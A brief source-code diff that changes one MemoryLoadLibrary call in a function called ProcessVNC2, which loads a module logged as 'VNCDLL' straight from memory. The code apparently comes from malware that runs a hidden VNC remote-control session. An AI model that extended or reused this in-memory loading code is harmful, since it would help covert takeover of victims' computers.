@@ -703,7 +703,7 @@ DWORD WINAPI ProcessVNC2(void*)
 		param.pModule64 = 0;
 		param.Module32Size = c_data;
 		param.Module64Size = 0;
-		HMEMORYMODULE module = MemoryLoadLibrary( data, &param );
+		HMEMORYMODULE module = MemoryLoadLibrary( data, true, &param );
 		if( module )
 		{
 			VDRDBG( "Video", "VNCDLL is run" );
